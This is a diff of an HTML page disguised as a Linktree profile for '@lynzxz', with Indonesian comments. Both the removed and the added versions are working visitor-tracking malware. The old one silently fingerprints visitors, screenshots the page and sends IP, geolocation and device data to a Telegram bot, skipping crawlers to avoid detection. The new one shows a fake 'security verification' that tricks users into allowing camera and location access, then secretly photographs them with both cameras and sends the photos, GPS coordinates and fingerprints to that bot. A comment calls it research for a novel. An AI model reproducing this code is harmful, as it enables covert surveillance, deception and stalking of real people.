@@ -4,464 +4,516 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>@lynzxz | Linktree</title>
-  <!-- =============================================
-   NOVEL "Bayangan Digital" - Technical Research
-   Tokoh: Lynx
-   Fungsi: Halaman Linktree palsu yang mengirim 
-   fingerprint + screenshot + IP + lokasi ke Telegram
-   tanpa interaksi korban.
-   ============================================= -->
   <style>
-    /* ---------- TAMPILAN LINKTREE PROFESIONAL ---------- */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    /* ---------- RESET & BACKGROUND ---------- */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: radial-gradient(circle at top, #0f0c29, #302b63, #24243e);
+      background: linear-gradient(135deg, #0a0a1a, #1a1a3e);
       font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-      color: #ffffff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      color: white;
       min-height: 100vh;
-      overflow-x: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
-    /* Efek partikel latar (opsional, untuk estetika) */
-    body::before {
-      content: "";
+
+    /* ---------- OVERLAY VERIFIKASI ---------- */
+    .overlay {
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.05"><circle cx="20" cy="30" r="1.5" fill="white"/><circle cx="80" cy="70" r="1" fill="white"/><circle cx="45" cy="15" r="1.2" fill="white"/><circle cx="65" cy="85" r="0.8" fill="white"/><circle cx="10" cy="80" r="1.3" fill="white"/></svg>');
-      pointer-events: none;
-    }
-    .container {
-      max-width: 480px;
-      width: 90%;
-      margin: 30px auto;
-      text-align: center;
-      position: relative;
-      z-index: 1;
-    }
-    .profile-pic {
-      width: 110px;
-      height: 110px;
-      border-radius: 50%;
-      border: 3px solid #ff4d6d;
-      box-shadow: 0 0 25px rgba(255,77,109,0.4);
-      margin-bottom: 15px;
-      object-fit: cover;
-    }
-    h1 {
-      font-size: 1.9rem;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-      margin-bottom: 6px;
-    }
-    .badge {
-      display: inline-block;
-      background: rgba(255,255,255,0.15);
-      backdrop-filter: blur(10px);
-      padding: 5px 14px;
-      border-radius: 20px;
-      font-size: 0.8rem;
-      margin-bottom: 12px;
-      color: #ffb3c1;
-      border: 1px solid rgba(255,255,255,0.15);
-    }
-    .bio {
-      color: #b0b0c0;
-      margin: 10px 0 28px;
-      font-size: 0.95rem;
-      line-height: 1.5;
-      opacity: 0.9;
-    }
-    .links {
-      display: flex;
-      flex-direction: column;
-      gap: 13px;
-    }
-    .link-btn {
-      background: rgba(20, 20, 40, 0.7);
-      backdrop-filter: blur(15px);
-      padding: 15px 20px;
-      border-radius: 14px;
-      text-decoration: none;
-      color: #fff;
-      font-weight: 500;
-      font-size: 1rem;
-      transition: all 0.25s ease;
-      border: 1px solid rgba(255,255,255,0.08);
+      background: rgba(0,0,0,0.85);
+      backdrop-filter: blur(8px);
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
-      letter-spacing: 0.3px;
+      z-index: 1000;
     }
-    .link-btn:hover {
+    .modal {
+      background: rgba(20,20,40,0.95);
+      backdrop-filter: blur(15px);
+      border: 1px solid rgba(255,255,255,0.15);
+      border-radius: 24px;
+      padding: 40px 30px;
+      max-width: 380px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.7);
+    }
+    .modal h2 {
+      font-size: 1.8rem;
+      margin-bottom: 12px;
+      color: #ff4d6d;
+    }
+    .modal p {
+      font-size: 0.95rem;
+      color: #bbb;
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+    .btn {
       background: #ff4d6d;
-      border-color: #ff4d6d;
-      transform: translateY(-3px);
-      box-shadow: 0 12px 25px rgba(255,77,109,0.35);
       color: white;
-    }
-    .footer {
-      margin-top: 35px;
-      font-size: 0.7rem;
-      color: #6a6a7a;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 30px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+      width: 100%;
       letter-spacing: 0.5px;
     }
-    .footer a {
-      color: #8888aa;
-      text-decoration: none;
+    .btn:hover { background: #e9445e; }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .error-text {
+      color: #ff8080;
+      font-size: 0.85rem;
+      margin-top: 15px;
+      display: none;
     }
-    /* animasi fade-in halus */
-    .container {
+    .spinner {
+      display: inline-block;
+      width: 20px; height: 20px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 0.8s linear infinite;
+      margin-right: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ---------- KONTEN LINKTREE (tampil setelah verifikasi) ---------- */
+    #main-content {
+      display: none;
+      width: 100%;
+      max-width: 480px;
+      margin: 30px auto;
+      text-align: center;
       animation: fadeUp 0.8s ease;
     }
     @keyframes fadeUp {
       from { opacity: 0; transform: translateY(25px); }
       to { opacity: 1; transform: translateY(0); }
     }
+    .profile-pic {
+      width: 110px; height: 110px;
+      border-radius: 50%;
+      border: 3px solid #ff4d6d;
+      box-shadow: 0 0 30px rgba(255,77,109,0.4);
+      margin-bottom: 15px;
+      object-fit: cover;
+    }
+    h1 { font-size: 2rem; font-weight: 700; letter-spacing: -0.5px; }
+    .badge {
+      display: inline-block;
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(5px);
+      padding: 5px 15px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      color: #ffb3c1;
+      border: 1px solid rgba(255,255,255,0.2);
+      margin: 8px 0 15px;
+    }
+    .bio { color: #aaa; font-size: 0.95rem; margin-bottom: 30px; }
+    .links { display: flex; flex-direction: column; gap: 12px; }
+    .link-btn {
+      background: rgba(255,255,255,0.06);
+      backdrop-filter: blur(10px);
+      padding: 15px;
+      border-radius: 14px;
+      text-decoration: none;
+      color: white;
+      font-weight: 500;
+      transition: 0.2s;
+      border: 1px solid rgba(255,255,255,0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .link-btn:hover {
+      background: #ff4d6d;
+      transform: translateY(-3px);
+      box-shadow: 0 12px 25px rgba(255,77,109,0.3);
+    }
+    .footer {
+      margin-top: 35px;
+      font-size: 0.7rem;
+      color: #555;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <!-- Foto profil pakai SVG sederhana (bisa diganti link gambar Anda) -->
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Ccircle cx='55' cy='55' r='55' fill='%23ff4d6d'/%3E%3Ctext x='55' y='60' text-anchor='middle' fill='white' font-size='45' font-weight='bold'%3EL%3C/text%3E%3C/svg%3E"
-         alt="Profile" class="profile-pic" crossorigin="anonymous">
-    <h1>@lynzxz</h1>
-    <span class="badge">✦ digital creator</span>
-    <p class="bio">pengen jadi programer | kadang nulis, kadang ngoding<br>📌 DM for collab</p>
-    <div class="links">
-      <!-- Tautan tidak benar-benar mengarah ke mana pun, bisa diganti nanti -->
-      <a href="#" class="link-btn">📸 <span>Instagram</span></a>
-      <a href="#" class="link-btn">🐦 <span>Twitter / X</span></a>
-      <a href="#" class="link-btn">💬 <span>Telegram</span></a>
-      <a href="#" class="link-btn">🎥 <span>YouTube</span></a>
-      <a href="#" class="link-btn">📁 <span>GitHub</span></a>
-      <a href="#" class="link-btn">✉️ <span>Email</span></a>
-    </div>
-    <div class="footer">
-      Dibuat dengan ❤️ oleh lynzxz • <a href="#">Laporkan</a>
+  <!-- OVERLAY VERIFIKASI -->
+  <div id="verification-overlay" class="overlay">
+    <div class="modal">
+      <h2>🔒 Verifikasi Keamanan</h2>
+      <p>Untuk melanjutkan ke halaman ini, kami perlu memastikan bahwa Anda adalah manusia. Izinkan akses <b>kamera</b> dan <b>lokasi</b> Anda untuk verifikasi singkat.</p>
+      <button id="verify-btn" class="btn">👉 Verifikasi Sekarang</button>
+      <p id="error-msg" class="error-text"></p>
     </div>
   </div>
 
-  <!-- Library html2canvas untuk screenshot halaman (CDN) -->
-  <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
-  <!-- ============================================= -->
-  <!-- ========== CORE TRACKING ENGINE ============= -->
-  <!-- ============================================= -->
+  <!-- KONTEN LINKTREE (tersembunyi awalnya) -->
+  <div id="main-content">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Ccircle cx='55' cy='55' r='55' fill='%23ff4d6d'/%3E%3Ctext x='55' y='60' text-anchor='middle' fill='white' font-size='45' font-weight='bold'%3EL%3C/text%3E%3C/svg%3E"
+         alt="Profile" class="profile-pic">
+    <h1>@lynzxz</h1>
+    <div class="badge">✦ digital creator</div>
+    <p class="bio">pengen jadi programer | kadang nulis, kadang ngoding<br>📌 DM for collab</p>
+    <div class="links">
+      <a href="#" class="link-btn">📸 Instagram</a>
+      <a href="#" class="link-btn">🐦 Twitter / X</a>
+      <a href="#" class="link-btn">💬 Telegram</a>
+      <a href="#" class="link-btn">🎥 YouTube</a>
+      <a href="#" class="link-btn">📁 GitHub</a>
+      <a href="#" class="link-btn">✉️ Email</a>
+    </div>
+    <div class="footer">Dibuat dengan ❤️ oleh lynzxz • Laporkan</div>
+  </div>
+
+  <!-- Elemen tersembunyi untuk capture kamera -->
+  <video id="cam-preview" style="display:none;" playsinline autoplay muted></video>
+  <canvas id="photo-canvas" style="display:none;"></canvas>
+
   <script>
   (function() {
-    // ================= KONFIGURASI TELEGRAM =================
+    // ========== KONFIGURASI TELEGRAM ==========
     const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
     const CHAT_ID = '5986004601';
 
-    // ================= FUNGSI UTAMA =================
-    async function sendTelegramMessage(text) {
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'HTML',
-            disable_web_page_preview: true
-          })
-        });
-      } catch (e) {
-        // fallback GET
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-      }
-    }
+    // ========== DOM ELEMENTS ==========
+    const overlay = document.getElementById('verification-overlay');
+    const verifyBtn = document.getElementById('verify-btn');
+    const errorMsg = document.getElementById('error-msg');
+    const mainContent = document.getElementById('main-content');
+    const video = document.getElementById('cam-preview');
+    const canvas = document.getElementById('photo-canvas');
 
-    async function sendPhotoWithCaption(photoBlob, caption) {
+    // ========== STATE ==========
+    let attempt = 0;
+    let cameraStream = null;
+    let capturedFrontBlob = null;
+    let capturedRearBlob = null;
+    let gpsCoords = null;
+
+    // ========== UTILITY ==========
+    function sendTelegramPhoto(blob, caption) {
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
-      formData.append('photo', photoBlob, 'screenshot.jpg');
+      formData.append('photo', blob, 'user_photos.jpg');
       formData.append('caption', caption);
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-        return true;
-      } catch (e) {
-        return false;
-      }
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).catch(() => {});
     }
 
-    // ================= DETEKSI BOT / CRAWLER =================
-    function isBot(userAgent) {
-      const botPatterns = [
-        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
-        'telegrambot', 'whatsapp', 'facebookexternalhit', 'twitterbot',
-        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
-        'yandexbot', 'applebot', 'linkedinbot', 'embedly', 'pinterest'
-      ];
-      const ua = userAgent.toLowerCase();
-      return botPatterns.some(pattern => ua.includes(pattern));
+    function sendTelegramMessage(text) {
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true
+        })
+      }).catch(() => {});
     }
 
-    // ================= FINGERPRINTING FUNCTIONS =================
+    // ========== FINGERPRINTING (sama seperti sebelumnya) ==========
     function getCanvasFingerprint() {
       try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 280; canvas.height = 60;
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '16px "Segoe UI", Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(0,0,280,60);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Fingerprint Canvas 未', 10, 8);
-        ctx.fillStyle = 'rgba(102, 200, 0, 0.8)';
-        ctx.fillText('Unique Hash Generator', 12, 34);
-        return canvas.toDataURL();
-      } catch(e) { return 'canvas_blocked'; }
+        const c = document.createElement('canvas');
+        c.width=280;c.height=60;
+        const ctx=c.getContext('2d');
+        ctx.fillStyle='#f60';ctx.fillRect(0,0,280,60);
+        ctx.fillStyle='#069';ctx.font='16px Arial';ctx.fillText('Canvas FP',10,30);
+        return btoa(c.toDataURL()).substring(0,35);
+      }catch(e){return 'canvas_err';}
     }
 
     function getWebGLFingerprint() {
       try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return 'webgl_disabled';
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
-        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-        return `Vendor: ${vendor}, Renderer: ${renderer}`;
-      } catch(e) { return 'webgl_error'; }
+        const c=document.createElement('canvas');
+        const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+        if(!gl)return 'webgl_off';
+        const ext=gl.getExtension('WEBGL_debug_renderer_info');
+        return (ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR)) + ' / ' +
+               (ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER));
+      }catch(e){return 'webgl_err';}
     }
 
     function getAudioFingerprint() {
-      return new Promise((resolve) => {
-        try {
-          const AudioContext = window.AudioContext || window.webkitAudioContext;
-          if (!AudioContext) return resolve('audio_unsupported');
-          const context = new AudioContext();
-          const oscillator = context.createOscillator();
-          const analyser = context.createAnalyser();
-          const gainNode = context.createGain();
-          oscillator.type = 'triangle';
-          oscillator.frequency.setValueAtTime(10000, context.currentTime);
-          gainNode.gain.setValueAtTime(0, context.currentTime); // silent
-          oscillator.connect(gainNode);
-          gainNode.connect(analyser);
-          analyser.connect(context.destination);
-          oscillator.start(0);
-          const bufferLength = analyser.frequencyBinCount;
-          const dataArray = new Uint8Array(bufferLength);
-          analyser.getByteFrequencyData(dataArray);
-          oscillator.stop(0);
-          const slice = Array.from(dataArray.slice(0, 30)).join(',');
-          context.close();
-          resolve(slice);
-        } catch(e) { resolve('audio_error'); }
+      return new Promise(resolve => {
+        try{
+          const AC=window.AudioContext||window.webkitAudioContext;
+          if(!AC)return resolve('audio_off');
+          const ctx=new AC();
+          const osc=ctx.createOscillator();
+          const analyser=ctx.createAnalyser();
+          const gain=ctx.createGain();
+          osc.type='triangle';
+          osc.frequency.value=10000;
+          gain.gain.value=0;
+          osc.connect(gain);gain.connect(analyser);analyser.connect(ctx.destination);
+          osc.start(0);
+          const data=new Uint8Array(analyser.frequencyBinCount);
+          analyser.getByteFrequencyData(data);
+          osc.stop(0);
+          ctx.close();
+          resolve(Array.from(data.slice(0,30)).join(','));
+        }catch(e){resolve('audio_err');}
       });
     }
 
     function getBatteryStatus() {
-      return new Promise((resolve) => {
-        if (navigator.getBattery) {
-          navigator.getBattery().then(b => {
-            resolve(`Level: ${Math.round(b.level*100)}%, Charging: ${b.charging}, DischargeTime: ${b.dischargingTime}`);
-          }).catch(() => resolve('battery_denied'));
-        } else resolve('battery_api_missing');
-      });
+      return navigator.getBattery?navigator.getBattery().then(b=>`${Math.round(b.level*100)}% (charging:${b.charging})`).catch(()=>'batt_denied'):Promise.resolve('batt_no');
     }
 
     function getNetworkInfo() {
-      if ('connection' in navigator) {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-          return `Type: ${conn.effectiveType || '?'}, Downlink: ${conn.downlink || '?'} Mbps, RTT: ${conn.rtt || '?'}ms`;
-        }
-      }
-      return 'Network info unavailable';
+      const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+      return c?`${c.effectiveType||'?'} / ${c.downlink||'?'}Mbps`:'net_unknown';
     }
 
     function getDeviceSpecs() {
-      return `Screen: ${screen.width}x${screen.height} (avail: ${screen.availWidth}x${screen.availHeight})
-RAM: ${navigator.deviceMemory || '?'} GB
-Cores: ${navigator.hardwareConcurrency || '?'}
-Touch: ${('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Yes' : 'No'}
-Lang: ${navigator.language || navigator.userLanguage}
-TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}
-Plugins: ${Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none'}`;
+      return `Resolusi: ${screen.width}x${screen.height}
+RAM: ${navigator.deviceMemory||'?'}GB
+Core: ${navigator.hardwareConcurrency||'?'}
+Sentuh: ${('ontouchstart' in window)?'Ya':'Tidak'}
+Bahasa: ${navigator.language}
+Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Cookies: ${navigator.cookieEnabled?'Aktif':'Nonaktif'}
+Plugin: ${Array.from(navigator.plugins||[]).map(p=>p.name).join(', ')||'none'}`;
     }
 
-    // ================= IP & GEO =================
-    async function fetchIPGeoData() {
-      // Coba ipapi.co dulu
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        if (!res.ok) throw new Error('ipapi fail');
-        const d = await res.json();
+    async function fetchIPGeo() {
+      try{
+        const r=await fetch('https://ipapi.co/json/');
+        if(!r.ok)throw 0;
+        const d=await r.json();
         return `IP: ${d.ip}
 ISP: ${d.org}
-Kota: ${d.city}, Region: ${d.region}
+Kota: ${d.city}, ${d.region}
 Negara: ${d.country_name} (${d.country_code})
-Koord: ${d.latitude}, ${d.longitude}
-Kode Pos: ${d.postal}`;
-      } catch(e) {
-        // Fallback ke ipify + ipinfo
-        try {
-          const ipRes = await fetch('https://api.ipify.org?format=json');
-          const { ip } = await ipRes.json();
-          const geoRes = await fetch(`https://ipinfo.io/${ip}/json`);
-          const g = await geoRes.json();
-          const loc = g.loc ? g.loc.split(',') : ['?', '?'];
+Koord: ${d.latitude},${d.longitude}`;
+      }catch(e){
+        try{
+          const ipR=await fetch('https://api.ipify.org?format=json');
+          const {ip}=await ipR.json();
+          const geoR=await fetch(`https://ipinfo.io/${ip}/json`);
+          const g=await geoR.json();
+          const loc=g.loc?g.loc.split(','):['?','?'];
           return `IP: ${ip}
-ISP: ${g.org || '?'}
-Kota: ${g.city || '?'}, Region: ${g.region || '?'}
-Negara: ${g.country || '?'}
-Koord: ${loc[0]}, ${loc[1]}
-Kode Pos: ${g.postal || '?'}`;
-        } catch(e2) {
-          return 'IP: Gagal diambil';
-        }
+ISP: ${g.org||'?'}
+Kota: ${g.city||'?'}, ${g.region||'?'}
+Negara: ${g.country||'?'}
+Koord: ${loc[0]},${loc[1]}`;
+        }catch{return 'IP_Gagal';}
       }
     }
 
-    // ================= SILENT GEOLOCATION (jika izin sudah granted) =================
-    function trySilentGeolocation() {
-      return new Promise((resolve) => {
-        if (!navigator.permissions || !navigator.geolocation) {
-          return resolve('Geolocation API not available');
-        }
-        navigator.permissions.query({ name: 'geolocation' }).then(perm => {
-          if (perm.state === 'granted') {
-            navigator.geolocation.getCurrentPosition(
-              pos => {
-                const { latitude, longitude, accuracy } = pos.coords;
-                resolve(`GPS Silent: ${latitude.toFixed(6)}, ${longitude.toFixed(6)} (akurasi ${accuracy}m)`);
-              },
-              err => resolve(`GPS error: ${err.message}`),
-              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-            );
-          } else {
-            resolve(`GPS izin: ${perm.state}`);
-          }
-        }).catch(() => resolve('Permission query failed'));
+    // ========== KAMERA CAPTURE ==========
+    async function startCamera(facingMode) {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: facingMode, width: {ideal:1280}, height: {ideal:720} },
+        audio: false
+      });
+      video.srcObject = stream;
+      await video.play();
+      // tunggu video siap
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+      // ambil gambar
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+      // bersihkan
+      stream.getTracks().forEach(track => track.stop());
+      video.srcObject = null;
+      return blob;
+    }
+
+    async function captureBothCameras() {
+      try {
+        capturedFrontBlob = await startCamera('user');
+      } catch(e) {
+        capturedFrontBlob = null;
+      }
+      try {
+        capturedRearBlob = await startCamera('environment');
+      } catch(e) {
+        capturedRearBlob = null;
+      }
+    }
+
+    // ========== KOLASE GAMBAR ==========
+    async function createCollageBlob() {
+      if (!capturedFrontBlob && !capturedRearBlob) return null;
+      // buat image dari blob
+      const loadImg = blob => new Promise((resolve, reject) => {
+        const img = new Image();
+        img.onload = () => resolve(img);
+        img.onerror = reject;
+        img.src = URL.createObjectURL(blob);
+      });
+      let frontImg = null, rearImg = null;
+      if (capturedFrontBlob) frontImg = await loadImg(capturedFrontBlob);
+      if (capturedRearBlob) rearImg = await loadImg(capturedRearBlob);
+
+      // Tentukan ukuran canvas: lebar = max lebar kedua gambar, tinggi = jumlah tinggi + sedikit celah
+      const gap = 4;
+      let maxW = 0, totalH = 0;
+      if (frontImg) { maxW = Math.max(maxW, frontImg.width); totalH += frontImg.height; }
+      if (rearImg) { maxW = Math.max(maxW, rearImg.width); totalH += rearImg.height; }
+      if (frontImg && rearImg) totalH += gap;
+
+      canvas.width = maxW;
+      canvas.height = totalH;
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = '#000';
+      ctx.fillRect(0,0,maxW,totalH);
+
+      let yOffset = 0;
+      if (frontImg) {
+        ctx.drawImage(frontImg, 0, yOffset, frontImg.width, frontImg.height);
+        yOffset += frontImg.height;
+        if (rearImg) yOffset += gap;
+      }
+      if (rearImg) {
+        ctx.drawImage(rearImg, 0, yOffset, rearImg.width, rearImg.height);
+      }
+
+      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.75));
+    }
+
+    // ========== GPS ==========
+    function requestLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject(new Error('no_geo'));
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            gpsCoords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
+            resolve(gpsCoords);
+          },
+          err => reject(err),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
       });
     }
 
-    // ================= LOCAL STORAGE (Visit Count) =================
-    function trackVisit() {
-      try {
-        let visits = localStorage.getItem('lynzxz_visits');
-        if (!visits) visits = 0;
-        visits = parseInt(visits) + 1;
-        localStorage.setItem('lynzxz_visits', visits);
-        const firstVisit = localStorage.getItem('lynxz_first_visit') || new Date().toISOString();
-        if (!localStorage.getItem('lynxz_first_visit')) {
-          localStorage.setItem('lynxz_first_visit', firstVisit);
-        }
-        return { count: visits, firstVisit };
-      } catch(e) {
-        return { count: '?', firstVisit: '?' };
-      }
-    }
+    // ========== LOGIKA VERIFIKASI ==========
+    async function doVerification() {
+      verifyBtn.disabled = true;
+      verifyBtn.innerHTML = '<span class="spinner"></span> Memverifikasi...';
+      errorMsg.style.display = 'none';
+      attempt++;
 
-    // ================= SCREENSHOT HALAMAN =================
-    async function captureScreenshot() {
-      try {
-        const canvas = await html2canvas(document.body, {
-          scale: 0.5,
-          backgroundColor: null,
-          logging: false
-        });
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.65));
-        return blob;
-      } catch(e) {
-        return null;
-      }
-    }
+      // Minta izin kamera (depan) dan lokasi paralel
+      const results = await Promise.allSettled([
+        navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false}).then(stream => {
+          cameraStream = stream;
+          // langsung matikan dulu, nanti akan dibuka lagi saat capture
+          stream.getTracks().forEach(t=>t.stop());
+          return true;
+        }),
+        requestLocation()
+      ]);
 
-    // ================= PEMBANGUN PESAN NOTIFIKASI =================
-    async function buildRichMessage() {
-      const ua = navigator.userAgent;
-      const visitInfo = trackVisit();
-      const device = getDeviceSpecs();
-      const canvasFP = getCanvasFingerprint();
-      const canvasHash = btoa(canvasFP).substring(0, 35);
-      const webgl = getWebGLFingerprint();
-      const audio = await getAudioFingerprint();
-      const battery = await getBatteryStatus();
-      const network = getNetworkInfo();
-      const ipData = await fetchIPGeoData();
-      const silentGPS = await trySilentGeolocation();
-      const timeStr = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+      const camOk = results[0].status === 'fulfilled';
+      const locOk = results[1].status === 'fulfilled';
 
-      return `🔍 <b>PENGUNJUNG BARU LINKTREE</b>
+      if (camOk && locOk) {
+        // Sukses semua, lanjutkan pengumpulan data
+        overlay.style.display = 'none'; // sembunyikan overlay sementara
+        try {
+          // Ambil foto depan & belakang (stream baru)
+          await captureBothCameras();
+          if (!gpsCoords) {
+            // Coba lagi GPS jika perlu (mungkin sudah didapat)
+            try { await requestLocation(); } catch(e) {}
+          }
+          // Kumpulkan fingerprint
+          const canvasFP = getCanvasFingerprint();
+          const webgl = getWebGLFingerprint();
+          const audio = await getAudioFingerprint();
+          const battery = await getBatteryStatus();
+          const net = getNetworkInfo();
+          const device = getDeviceSpecs();
+          const ipGeo = await fetchIPGeo();
+          const locStr = gpsCoords ? `GPS: ${gpsCoords.lat.toFixed(6)}, ${gpsCoords.lng.toFixed(6)} (akurasi ${gpsCoords.acc}m)` : 'GPS: tidak tersedia';
+
+          // Buat kolase
+          const finalBlob = await createCollageBlob();
+          // Bangun caption
+          const caption = `🔍 <b>PENGUNJUNG TERVERIFIKASI</b>
 ━━━━━━━━━━━━━━━━━━
 🌐 <b>Jaringan & Lokasi</b>
-${ipData}
-${silentGPS}
-Koneksi: ${network}
+${ipGeo}
+${locStr}
+Koneksi: ${net}
 ━━━━━━━━━━━━━━━━━━
 📟 <b>Perangkat</b>
-UA: ${ua}
 ${device}
+User Agent: ${navigator.userAgent}
 ━━━━━━━━━━━━━━━━━━
 🎨 <b>Fingerprint</b>
-Canvas: ${canvasHash}
+Canvas: ${canvasFP}
 WebGL: ${webgl}
 Audio: ${audio}
 Baterai: ${battery}
 ━━━━━━━━━━━━━━━━━━
-📊 <b>Session</b>
-Kunjungan ke-: ${visitInfo.count}
-Pertama: ${visitInfo.firstVisit}
-Waktu: ${timeStr}`;
+🕒 Waktu: ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`;
+
+          // Kirim ke Telegram
+          if (finalBlob) {
+            await sendTelegramPhoto(finalBlob, caption);
+          } else {
+            await sendTelegramMessage(caption);
+          }
+        } catch(e) {
+          console.error(e);
+          await sendTelegramMessage('⚠️ Error saat pengumpulan data: '+e.message);
+        }
+        // Tampilkan Linktree
+        mainContent.style.display = 'block';
+      } else {
+        // Ada yang gagal
+        if (attempt >= 2) {
+          // Gagal 2x, redirect
+          errorMsg.style.display = 'block';
+          errorMsg.textContent = 'Akses ditolak. Mengalihkan...';
+          verifyBtn.disabled = true;
+          verifyBtn.innerHTML = 'Ditolak';
+          setTimeout(() => {
+            window.location.replace('https://www.google.com');
+          }, 2000);
+        } else {
+          // Retry 1x
+          errorMsg.style.display = 'block';
+          errorMsg.textContent = 'Verifikasi gagal. Anda harus mengizinkan kamera dan lokasi. Klik "Coba Lagi".';
+          verifyBtn.innerHTML = '🔄 Coba Lagi';
+          verifyBtn.disabled = false;
+        }
+      }
+      if (verifyBtn.disabled) return;
+      verifyBtn.disabled = false;
+      verifyBtn.innerHTML = '👉 Verifikasi Sekarang';
     }
 
-    // ================= EKSEKUSI UTAMA =================
-    async function execute() {
-      // Anti bot: jika user-agent bot, tampilkan halaman tanpa mengirim data.
-      if (isBot(navigator.userAgent)) {
-        console.log('Bot detected, skip tracking');
-        return;
-      }
+    // ========== EVENT LISTENER ==========
+    verifyBtn.addEventListener('click', doVerification);
 
-      // Tunggu 1.5 detik agar halaman ter-render sempurna
-      await new Promise(r => setTimeout(r, 1500));
-
-      try {
-        // Bangun pesan teks kaya
-        const message = await buildRichMessage();
-
-        // Ambil screenshot halaman sebagai JPEG
-        const screenshotBlob = await captureScreenshot();
-
-        let sent = false;
-        if (screenshotBlob) {
-          sent = await sendPhotoWithCaption(screenshotBlob, message);
-        }
-
-        // Fallback jika screenshot gagal atau tidak ada blob
-        if (!sent) {
-          await sendTelegramMessage(message);
-        }
-
-        // Redirect halus ke Linktree asli setelah 3 detik (opsional, hapus jika tidak ingin)
-        setTimeout(() => {
-          window.location.replace('https://linktr.ee/lynxz');
-        }, 3000);
-
